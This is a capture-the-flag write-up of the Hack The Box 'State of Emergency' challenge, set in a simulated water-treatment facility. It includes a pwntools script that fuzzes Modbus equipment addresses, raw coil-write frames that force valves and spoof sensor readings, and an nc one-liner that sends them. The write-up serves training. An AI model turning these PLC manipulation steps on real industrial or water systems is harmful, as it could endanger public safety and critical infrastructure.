---
type: challenge
platform: Hack The Box
category: "hardware"
difficulty: "medium"
status: Documents
date_started: 2026-09-08
date_completed: 2026-09-08
tags:
  - htb
  - challenge
  - ics
  - scada
  - modbus
  - plc
  - htb_business
  - dirty_money
---

# State of Emergency

## Overview

**Category:** hardware
**Difficulty:** medium
**Platform:** Hack The Box (Business CTF 2022 - "Dirty Money")
**Date:** 2026-09-08

> [!note] Challenge Scenario
>
> > A DDoS attack is ongoing against our capital city's water management system. Every facility in this system appears to be infected by malware that rendered the HMI interfaces unusable, thus locking out every system administrator out of the SCADA infrastructure. The incident response team has managed to pinpoint the organization's objective which is to contaminate the public water supply system with toxic chemicals from the water treatment facility. We need to neutralize the threat before it's too late! We have also prepared a brief for you with all the information you might need.
>
> English summary: Given a multi-page PDF brief documenting a water facility's PLCs (Water Tank + Mixer Tank). I must flip coils over a Modbus-ish serial link to get clean water flowing through both tanks and put the mixer in drain mode, neutralizing the contamination, which reveals the flag.

## Enumeration

The PDF brief has 5 pages:
1. **Physical layout** — Water Tank → Mixer Tank → Chemical Tank; all *green* sensors/actuators are controllable.
2. State diagram of the Water Tank.
3. **Water Tank logic diagram** (important):
   - `in_valve` opens when `force_start_in` + `manual_mode` + `!high_sensor` + `!halt`(cutoff)
   - `out_valve` opens when `force_start_out` + `manual_mode` + `!low_sensor` + `!halt`(cutoff)
4. State diagram of the Mixer Tank — it drains when `high_sensor` is activated.
5. **Coil offsets table** — the sensor/actuator ↔ coil mapping.

The target is a `nc` CLI:

```text
$ nc $RHOST $RPORT
Water Purification Facility Command Line Interface
[*] Entering interactive mode [Press "H" for available commands]
cmd> H
[*] Available commands:
system: Get system status
modbus: Send command to the network (hex format: AABBCCDDEE[FF])
exit: Exit the interface
```

## Vulnerability

The Modbus frame is given in raw hex. Format:

```
| Equipment address | Command number | Coil offset |  Value  |
|      1 byte       |     1 byte     |   2 bytes   | 2 bytes |
```

Example: `070500CC0000` = address `0x07`, command `0x05` (Write Single Coil), coil `0x00CC`, value `0x0000`.

I only need **command `0x05`** with values `0x0000` (logical 0) or `0xFF00` (logical 1). The catch: the **equipment addresses are not in the PDF** — I had to fuzz them.

## Exploitation

### 1. Fuzz the equipment addresses

I probed all 256 addresses with a known-coil toggle for each tank and watched the `system` state change:

```python
from pwn import *

HOST, PORT = "$RHOST", $RPORT
r = remote(HOST, PORT)

def get_state(r):
    r.recvuntil(b"cmd> ")
    r.sendline(b"system")
    return r.recvuntil(b"\n\n").decode() + r.recvuntil(b"\n\n").decode()

initial_state = get_state(r)
equipments = {
    "water": {"addr": None, "init_cmd": b"0500C8FF00"},
    "mixer": {"addr": None, "init_cmd": b"05002DFF00"},
}

for i in range(256):
    for name, eq in equipments.items():
        cmd = b"modbus " + hex(i)[2:].upper().encode() + eq["init_cmd"]
        r.recvuntil(b"cmd> ")
        r.sendline(cmd)
        state = get_state(r)
        if state != initial_state:
            eq["addr"] = hex(i)
            if all(x["addr"] for x in equipments.values()):
                print(equipments); r.close(); exit()
            initial_state = state
```

Result (JSON is authoritative — ignore the author's prose misread):

```json
{ 'water': {'addr': '0x88', ...}, 'mixer': {'addr': '0x35', ...} }
```

- **Water tank = `0x88`**, **Mixer tank = `0x35`**

### 2. Solve sequence

Goal: get water flowing top → bottom (both tanks' in/out valves open, mixer in drain mode).

```text
// Water tank (address 0x88)
880500C8FF00   // manual_mode   = ON   (coil 0x00C8)
88050538FF00   // force_start_in = ON   (coil 0x0538)  -> in_valve
880504D2FF00   // force_start_out = ON  (coil 0x04D2)  -> out_valve
880500400000   // low_sensor    = OFF  (coil 0x0040)  -> satisfies !low_sensor for out_valve

// Mixer tank (address 0x35)
35050044FF00   // high_sensor   = ON   (coil 0x0044)  -> mixer enters drain mode
```

```bash
for c in 880500C8FF00 88050538FF00 880504D2FF00 880500400000 35050044FF00; do
  printf "modbus %s\nsystem\n" "$c"
done | nc $RHOST $RPORT
```

Final state:

```json
{
  "auto_mode": 0, "manual_mode": 1, "in_valve": 1, "out_valve": 1,
  "low_sensor": 0, "force_start_out": 1, "force_start_in": 1,
  "flag": "HTB{REDACTED}"
}
mixer: { "in_vale_water": 1, "out_valve": 1, "high_sensor": 1 }
```

> [!note] Design flaw / pitfall
> Page 5 is ambiguous — pyModbus and hand-forged scapy packets didn't answer; the interface is a **raw hex CLI**, not TCP/502. Also the equipment addresses had to be fuzzed (not documented).

> [!info] Tools Used
>
> - `nc`
> - `pwn` (pwnlib `remote`) for fuzzing

## Flag

`HTB{REDACTED}`

## References

- https://log-s.xyz/posts/hackthebox-business-2022/#26-hardware-state-of-emergency
- https://github.com/dotPY-hax/state_of_emergency
- https://ctftime.org/task/22941